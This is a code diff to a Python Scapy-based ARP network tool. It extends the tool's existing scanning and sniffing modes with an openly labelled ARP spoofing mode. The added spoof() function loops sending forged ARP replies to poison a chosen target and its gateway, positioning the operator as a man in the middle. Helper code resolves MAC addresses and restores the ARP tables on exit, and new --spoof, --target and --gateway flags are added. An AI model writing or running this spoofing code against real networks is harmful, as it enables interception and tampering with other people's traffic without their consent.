@@ -3,8 +3,9 @@ import os
 import json
 import csv
 import requests
+import signal
 from datetime import datetime
-from scapy.all import srp, Ether, ARP, sniff, conf, get_if_hwaddr
+from scapy.all import srp, Ether, ARP, sniff, send, conf, get_if_hwaddr
 from mac_vendor_lookup import MacLookup
 from tqdm import tqdm
 
@@ -50,6 +51,7 @@ def get_geolocation(ip):
         return "Unknown"
     except:
         return "Unknown"
+
 
 # primary function for arp scan, including vendor check, progress bar, datetime
 def arp_scan(interface, ips, output_handler):
@@ -113,27 +115,69 @@ def passive_sniff(interface, output_handler):
 
     sniff(filter="arp", prn=handle_packet, store=0, iface=interface)
 
-# main function and an argument parser for cli customizability
+# function that restores arp tables for spoofing
+def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac, iface):
+    print("\n|!| Restoring ARP tables...")
+    send(ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip, hwsrc=gateway_mac), count=3, iface=iface)
+    send(ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip, hwsrc=target_mac), count=3, iface=iface)
+
+# function that enables spoofing mode through sending requests
+def spoof(target_ip, target_mac, gateway_ip, iface):
+    gateway_mac = getmac(gateway_ip, iface)
+    if not gateway_mac:
+        print("|x| Failed to resolve gateway MAC address.")
+        return
+
+    print(f"|*| Starting ARP spoofing: {target_ip} <-> {gateway_ip}")
+    try:
+        while True:
+            send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac), iface=iface, verbose=0)
+            send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac), iface=iface, verbose=0)
+    except KeyboardInterrupt:
+        restore_arp(target_ip, target_mac, gateway_ip, gateway_mac, iface)
+
+# function to attain the mac address
+def getmac(ip, iface):
+    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, iface=iface, verbose=0)
+    for _, rcv in ans:
+        return rcv.hwsrc
+    return None
+
+# arg parser for cli customizability
 def main():
     import argparse
-    parser = argparse.ArgumentParser(description="ARP Network Scanner (Active & Passive Modes)")
+    parser = argparse.ArgumentParser(description="ARP Network Tool (Active/Passive Scan + Spoofing)")
     parser.add_argument("interface", help="Interface to use (e.g. eth0)")
     parser.add_argument("ips", nargs="?", help="CIDR/IP range for active scan (e.g. 192.168.1.0/24)")
     parser.add_argument("-p", "--passive", action="store_true", help="Enable passive sniffing mode")
     parser.add_argument("-o", "--output", type=str, help="Output file path")
     parser.add_argument("-f", "--format", choices=["json", "csv"], default="json", help="Output format (default: json)")
+    parser.add_argument("--spoof", action="store_true", help="Enable ARP spoofing mode")
+    parser.add_argument("--target", help="Target IP for spoofing")
+    parser.add_argument("--gateway", help="Gateway IP for spoofing")
     args = parser.parse_args()
 
     check_root()
-
     out = OutputHandler(args.output, args.format)
 
-    if args.passive:
+    if args.spoof:
+        if not args.target or not args.gateway:
+            print("|x| --target and --gateway are required for spoofing")
+            return
+        target_mac = getmac(args.target, args.interface)
+        if not target_mac:
+            print(f"|x| Failed to resolve MAC for target {args.target}")
+            return
+        spoof(args.target, target_mac, args.gateway, args.interface)
+
+    elif args.passive:
         passive_sniff(args.interface, out)
+
     elif args.ips:
         arp_scan(args.interface, args.ips, out)
+
     else:
-        print("|x| You must provide either an IP range for active scan or use --passive")
+        print("|x| You must provide either --spoof, an IP range for active scan, or use --passive")
         return
 
     if out.results:
